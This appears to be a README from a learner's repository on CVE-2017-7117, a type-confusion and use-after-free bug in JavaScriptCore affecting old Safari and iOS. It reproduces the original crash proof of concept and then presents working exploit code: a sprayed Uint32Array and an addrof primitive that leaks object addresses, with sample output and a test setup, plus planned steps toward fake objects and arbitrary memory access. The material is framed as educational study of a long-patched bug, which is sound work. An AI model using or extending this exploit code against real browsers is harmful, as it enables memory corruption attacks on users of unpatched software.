# cve-2017-7117

## About the Bug

A type-confusion and UAF found in iOS 10.3.4 and earlier, Safari before 11.0.

CVE-2017-7117: [mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7117)

## Original Proof of Concept

Discovered by @lokihardt, source: [Google Project Zero](https://project-zero.issues.chromium.org/issues/42450350)

```js
function f() {
  let o = {};
  for (let i in {xx: 0}) { // i is a String
    for (i of [0]) { // i is now a number, but JIT treats as String
    }
    print(o[i]); // whoops
  }  
}

f();
```

Running the code above will cause JSC to crash.

## The Exploit

We craft a large array `arr`, that the JIT compiler will become confused into beleiving is a string. 

```js
var arr = new Uint32Array(1 * 1024 * 1024 / 4); // 1mb | 1 item == 4 bytes
arr[4] = 0xb0; // to pass checks for the member m_hashAndFlags 
```

When the reference to `i` is lost, we maintain access to the original array `arr` and can read the underlying memory.

By spraying a known value we can find this and traveerse up to locate the pointer to any object.

```js
function addrof(obj) {

    // search the freed array for this number
    var locator = 0x1337;

    // spray the freed memory with the locator
    var sprays = [];
    for (var i = 0; i < 0x1000; ++i) {
        sprays.push(i % 2 == 0 ? locator : obj);
    }

    // find the first instance of the locator
    var found = null;
    for(var i = 0; i < arr.length; i++) {
        if(arr[i] == locator) {
            found = i
            break
        }
    }

    // the pointer for the object is 3 and 2 indicies after the locator
    return found && [arr[found + 3], arr[found + 2]]

}
```

Values are accessed in memory via a `Uint32Array`, lower bits first, upper bits second.

```js
let target = {
    foo: "bar"
}

let address = addrof(target)
// address: 0x0000ffff8d178e60
```

You can verify the address is valid using `describe()`

```js
print(describe(target))
// Object: 0xffff8d178e60 with butterfly (nil) (0xffff9099bba0:[Object, {foo:0}, NonArray, Proto:0xffff909b00a0, Leaf]), ID: 244
```

## Replicate the Setup

Currently tested on:
- Ubuntu 20.04.5 LTS ARM64
- Vulnerable JavaScriptCore (JSC) from libwebkitgtk version 2.16.0
  - Build archive: [launchpad.net](https://launchpad.net/ubuntu/+source/webkit2gtk/2.16.0-1)
- LLDB for memory inspection (optional)

Does not work (yet) on iPhone 5, iOS 10.3.4. Let's find out why ...

## Next Steps?

- Craft a fake object
- Read / write arbitrary memory
- Jailbreak iOS 10?

## Important

This repository is provided as an educational resource to track my learning in exploit development. This CVE has been patched for more than 7 years. Do NOT use this for nefarious purposes, obviously.
